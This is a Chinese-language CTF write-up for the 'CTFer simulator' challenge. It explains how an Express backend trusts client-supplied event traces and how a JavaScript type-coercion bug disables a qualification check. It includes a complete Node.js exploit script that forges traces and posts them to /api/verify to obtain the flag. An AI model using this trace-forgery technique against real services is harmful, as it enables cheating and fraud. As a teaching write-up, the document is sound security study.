# CTFer simulator

## 题目简述

题目把一款 CTF 养成小游戏的前端状态同步到 Express 后端：客户端提交随机种子、随机数序列和事件轨迹，服务端重放轨迹；在 48 小时内取得 8 个游戏内 flag 后，`POST /api/verify` 返回环境变量中的真实 flag。

虽然原仓库把题目放在 `misc`，决定性漏洞位于 HTTP 校验接口及其服务端状态机，因此按 Web 逻辑漏洞归类更恰当。源码使用 `seedrandom.alea(seed)` 重建伪随机序列，不能直接伪造随机数，但事件的合法顺序、时间、体力和考试结果都没有被可靠校验。

## 解题过程

请求体必须包含三个字段：

```json
{
  "randomseed": "seed",
  "randoms": [],
  "traces": []
}
```

服务端首先用同一 seed 重新生成 `randoms` 并逐项比较，所以利用点不是伪造随机数，而是控制这些随机数被状态机如何消费。轨迹中的 `event` 会无条件覆盖当前 `processEvent`，后端既没有事件白名单，也没有验证事件是否真由前端触发；`action` 只零散检查下一项动作及随机数游标。

取得一个游戏内 flag 的最短资源链为：

1. 在 `HourBeginTasks` 中选择 `1`，当随机数小于 `0.6` 时得到 `insight`；
2. 选择 `2`，当随机数小于 `0.8` 时把 `insight` 转为 `draftExp`；
3. 选择 `3`，当随机数小于 `0.7` 时得到 `tunedExp`；
4. 选择 `4`，当随机数小于 `0.7` 时得到 `submittedFlag`；
5. 人工切换到 `flagCheck` 事件，提交小于 `0.6` 的随机数，把 `submittedFlag` 转成 `flag`。

不满足阈值的随机数可以放在伪造事件 `haha` 下，通过 `DisplayRandomMessage` 合法推进随机数游标。更关键的是资格检查写成了：

```javascript
if (rndExpected < 'Qualify') {
    // 更新 qualified
}
```

数值与无法转为数值的字符串比较时结果恒为 `false`，所以这段代码不会执行，`qualified` 会一直保持初始值 `true`。最终也只检查 `items.flag >= 8 && qualified`，没有检查 48 小时、体力或完整前端流程。

下面的脚本按后端实际消费顺序生成 8 轮轨迹。需要 Node.js 18 及 `seedrandom`，运行时把题目地址作为第一个参数传入：

```javascript
const seedrandom = require('seedrandom');

const base = process.argv[2] || 'http://target';
const seed = '5702857508689732';
const rng = seedrandom.alea(seed, { state: true });
const randoms = [];
const traces = [];

function take() {
    const value = rng();
    randoms.push(value);
    return value;
}

function waitFor(limit) {
    while (true) {
        const value = take();
        if (value < limit) {
            return value;
        }
        traces.push(['event', ['haha', []]]);
        traces.push(['action', ['DisplayRandomMessage', [value, 0]]]);
    }
}

for (let round = 0; round < 8; round++) {
    let value = waitFor(0.6);
    traces.push(['event', ['HourBeginTasks', []]]);
    traces.push(['action', ['DisplayChoices', [1]]]);
    traces.push(['action', ['CoinFlip', [value]]]);
    traces.push(['action', ['DisplayRandomMessage', [take(), 0]]]);
    traces.push(['action', ['CoinFlip', [take()]]]);

    value = waitFor(0.8);
    traces.push(['event', ['HourBeginTasks', []]]);
    traces.push(['action', ['DisplayChoices', [2]]]);
    traces.push(['action', ['CoinFlip', [value]]]);

    value = waitFor(0.7);
    traces.push(['event', ['HourBeginTasks', []]]);
    traces.push(['action', ['DisplayChoices', [3]]]);
    traces.push(['action', ['CoinFlip', [value]]]);

    value = waitFor(0.7);
    traces.push(['event', ['HourBeginTasks', []]]);
    traces.push(['action', ['DisplayChoices', [4]]]);
    traces.push(['action', ['CoinFlip', [value]]]);

    value = waitFor(0.6);
    traces.push(['event', ['flagCheck', []]]);
    traces.push(['action', ['CoinFlip', [value]]]);
    traces.push(['action', ['CoinFlip', [take()]]]);
}

fetch(`${base}/api/verify`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ randomseed: seed, randoms, traces })
})
    .then(response => response.text())
    .then(console.log);
```

后端重放后 `items.flag` 恰好达到 8，响应形式为：

```text
This is your flag: ACTF{...}
```

## 方法总结

题目的随机数校验本身有效，但服务端把不可信的客户端事件轨迹当成了可信状态迁移。分析这类游戏接口时，应分别检查随机性、资源守恒、事件顺序和最终胜利条件；只要其中一层缺失，就可能在保持随机序列完全合法的同时伪造整个游戏过程。本题还包含典型的 JavaScript 隐式类型转换错误，使资格校验实际上失效。
